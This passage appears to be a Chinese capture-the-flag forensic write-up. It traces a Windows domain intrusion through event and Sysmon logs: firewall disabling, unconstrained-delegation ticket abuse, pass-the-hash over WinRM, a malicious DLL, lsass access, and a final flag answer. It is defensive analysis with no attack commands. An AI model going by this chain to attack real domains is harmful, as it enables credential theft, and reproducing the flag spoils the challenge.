**简单比喻：**

> 就像两个人用对讲机在特定频道上通话。频道号就是“管道名”，只要调到同一个频道，就能开始通信

![](https://pic1.imgdb.cn/item/690b11033203f7be00d604b6.png)

同一时间在 `Security Log` 中发现登录日志，账户名为 `iis`

![](https://pic1.imgdb.cn/item/690b164c3203f7be00d6110b.png)

后续修改账户密码于 2024/12/18 9:59:44

![](https://pic1.imgdb.cn/item/690b1a5e3203f7be00d61fee.png)

2024/12/18 9:59:50 远程登录 web01，用户名是 Administrator

![](https://pic1.imgdb.cn/item/690b1c413203f7be00d6260f.png)

2024/12/18 10:12:14 关闭了防火墙于日志 `Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx`

![](https://pic1.imgdb.cn/item/690b1eb13203f7be00d629eb.png)

2024/12/18 10:12:19 攻击者利用无约束委派请求票据

![](https://pic1.imgdb.cn/item/690b224c3203f7be00d6401e.png)

2024/12/18 10:13:04 获取票据后利用票据获取域内账户 hash 后

事件 ID 4648 尝试登录 10.0.10.43

![](https://pic1.imgdb.cn/item/690bfadb3203f7be00d9a0ec.png)

登录 `DC02$` 成功

![](https://pic1.imgdb.cn/item/690bf95f3203f7be00d98a8b.png)

**以下为 dc02 的日志**

2024/12/18 10:31:08 攻击者通过 winrm 使用 `administrator` 哈希登陆 `dc02`

![](https://pic1.imgdb.cn/item/690c06643203f7be00da33b4.png)

2024/12/18 10:31:20 更改账户密码

![](https://pic1.imgdb.cn/item/690c086d3203f7be00da5617.png)

2024/12/18 10:31:28 Kali 远程登录 `DC02`

![](https://pic1.imgdb.cn/item/690c099c3203f7be00da682f.png)

2024/12/18 10:31:49~50 上传了两个文件于日志 `Microsoft-Windows-Sysmon/Operational`

![](https://pic1.imgdb.cn/item/690c11d33203f7be00dacd57.png)

2024/12/18 10:48:39 恶意加载了 DLL

![](https://pic1.imgdb.cn/item/690c127d3203f7be00dad415.png)

在 `Microsoft-Windows-Sysmon/Operational` 日志中也能找到对应的痕迹

![](https://pic1.imgdb.cn/item/690c165e3203f7be00daf97c.png)

随后又访问了 `lsass.exe`

![](https://pic1.imgdb.cn/item/690c16d53203f7be00dafe85.png)

在 DC03 的日志中发现其他主机远程登录的日志

![](https://pic1.imgdb.cn/item/690c1b463203f7be00db25dd.png)

在 DC03 的日志 `Microsoft-Windows-Sysmon/Operational`  发现进程访问 `333.exe`

![](https://pic1.imgdb.cn/item/690c1f6f3203f7be00db4ab6.png)

随后 `10.0.11.6` 与 `10.0.11.8` 建立连接

flag{C:\Users\Administrator\Desktop\333.exe}

![](https://pic1.imgdb.cn/item/690c1fb73203f7be00db4eb5.png)